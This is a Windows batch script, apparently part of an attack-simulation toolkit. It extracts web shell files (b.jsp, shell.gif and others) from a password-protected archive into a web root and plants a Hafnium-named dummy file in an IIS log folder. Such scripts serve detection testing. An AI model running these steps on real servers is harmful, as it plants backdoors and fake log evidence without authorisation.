@ECHO OFF

ECHO ===========================================================================
ECHO WEBSHELLS
ECHO Dropping web shell in new WWW directory
ping -n 5 127.0.0.1 > NUL

MKDIR "%WWWROOT%"
"%ZIP%" e -p%PASS% "%TOOLARCH%" -aoa -o"%WWWROOT%" toolset\b.jsp > NUL
"%ZIP%" e -p%PASS% "%TOOLARCH%" -aoa -o"%WWWROOT%" toolset\tests.jsp > NUL
"%ZIP%" e -p%PASS% "%TOOLARCH%" -aoa -o"%WWWROOT%" toolset\shell.gif > NUL
"%ZIP%" e -p%PASS% "%TOOLARCH%" -aoa -o"%WWWROOT%" toolset\image.bmp > NUL
"%ZIP%" e -p%PASS% "%TOOLARCH%" -aoa -o"C:\inetpub\logs\LogFiles\W3SVC2" toolset\hafnium-dummy.log > NUL
